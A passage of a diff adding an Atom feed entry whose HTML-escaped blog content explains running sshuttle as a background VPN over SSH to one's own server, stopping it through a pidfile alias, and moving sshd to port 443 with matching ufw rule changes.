+    &lt;span class="nt"&gt;-e&lt;/span&gt; &lt;span class="s2"&gt;"sudo -u your-user ssh"&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+    &lt;span class="nt"&gt;--daemon&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+    &lt;span class="nt"&gt;--pidfile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/your-user/sshuttle.pid &lt;span class="se"&gt;\&lt;/span&gt;
+    &lt;span class="nt"&gt;--exclude&lt;/span&gt; your-server-ip &lt;span class="se"&gt;\&lt;/span&gt;
+    &lt;span class="nt"&gt;-r&lt;/span&gt; your-user@your-server-ip 0/0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;three options have been added here:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--daemon&lt;/code&gt; to run sshuttle in background&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--pidfile&lt;/code&gt; to put a file containing shuttle&amp;#39;s PID in a defined path. change the latter according to your needs.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;the &lt;code&gt;-e&lt;/code&gt; flag will allow you to run the command as your main user and prompt for your SSH passphrase. this will use the right SSH pubkey to connect, even if ssh-agent isn&amp;#39;t loaded yet and sshuttle is ran as root.&lt;/p&gt;
+
+&lt;p&gt;stopping the VPN is easy: just &lt;code&gt;kill&lt;/code&gt; the PID given in &lt;code&gt;sshuttle.pid&lt;/code&gt;. this can be automated with the following alias, ran as root:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="nv"&gt;vpndown&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"kill '&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;cat&lt;/span&gt; /home/your-user/sshuttle.pid&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;'"&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;you should now be all set, just by adding the previous script in your &lt;code&gt;$path&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2&gt;misc: accessing the VPN when the SSH port is blocked&lt;/h2&gt;
+
+&lt;p&gt;if you want to connect on wifi hotspots, you might want to change the SSH port to 443 on your server as it is nearly guaranteed to be always opened, no matter how strict the wifi&amp;#39;s firewall is.&lt;/p&gt;
+
+&lt;p&gt;we have to change SSH&amp;#39;s default port on our server:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;vim /etc/ssh/sshd_config
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;find and change the following line accordingly. uncomment it if necessary:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Port 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;one thing left now is to change ufw rules on your server to open that port:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw limit &lt;span class="k"&gt;in &lt;/span&gt;443/tcp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;don&amp;#39;t forget to remove port 22 on ufw:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw status numbered
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;delete related rules with their IDs:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw delete &amp;lt;rule-id-here&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;now restart the sshd service:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;service sshd restart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;now, the only thing left is to specify the 443 port in the sshuttle script:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;-r your-user@your-server-ip:443 0/0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;the VPN should now be accessible from almost everywhere.&lt;/p&gt;
+</content>
+  </entry>
+</feed>
+
